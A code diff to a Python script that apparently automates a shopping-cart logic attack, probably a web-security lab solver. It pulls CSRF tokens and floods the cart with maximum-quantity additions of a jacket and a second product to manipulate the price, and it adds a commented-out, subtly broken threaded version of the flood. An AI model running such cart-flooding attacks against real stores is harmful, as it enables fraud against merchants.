@@ -4,6 +4,8 @@ from lxml import html
 from rich.console import Console
 from rich.table import Table
 from collections import namedtuple
+import aiohttp
+import asyncio
 
 console = Console()
 
@@ -18,7 +20,7 @@ Product = namedtuple("Product", "name price id")
 
 def fetch_csrf_token(session, endpoint):
     response = session.get(f"{SERVER}/{endpoint}")
-    console.log(f"Status code for cart csrf token request= {response.status_code}")
+    console.log(f"Status code for csrf token request= {response.status_code}")
     html_document = html.fromstring(response.content)
     csrf_token = html_document.xpath("//input[@name='csrf']/@value")[0]
     return csrf_token
@@ -111,6 +113,11 @@ def flood_the_cart(session,id):
             add_prod_to_cart(session,id,MAX_QTY_PER_REQUEST)
     add_prod_to_cart(session,id,remaining_qty)
 
+    """with concurrent.futures.ThreadPoolExecutor(max_workers=99) as executor:
+        futures = [executor.submit(add_prod_to_cart(session,JACKET_PRODUCT_ID,MAX_QTY_PER_REQUEST))
+                       for i in range (0,times)]
+        for future in concurrent.futures.as_completed(futures):
+            print('wewe')"""
 
 def flood_one_more_time(session, products, total_amount):
     sec_prod = second_most_expensive_prodId(products)    
